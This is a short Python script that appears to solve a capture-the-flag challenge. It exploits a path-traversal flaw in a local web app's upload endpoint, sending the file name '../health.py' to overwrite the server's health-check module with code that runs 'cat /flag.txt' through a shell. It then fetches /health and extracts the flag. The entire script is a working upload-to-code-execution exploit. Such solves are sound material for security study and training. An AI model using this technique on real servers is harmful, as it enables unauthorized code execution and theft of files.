import requests
import re

s = requests.Session()

url = "http://localhost:5000"
content = """
import subprocess

def check():
    return subprocess.run("cat /flag.txt",shell=True, capture_output=True, text=True).stdout
"""
file = {"file": ("../health.py", content)}
s.post(url + '/upload', files=file)

r = s.get(url + '/health')
FLAG = re.search(r"SSS\{.+?\}", r.text).group()
print(f"FLAG: {FLAG}")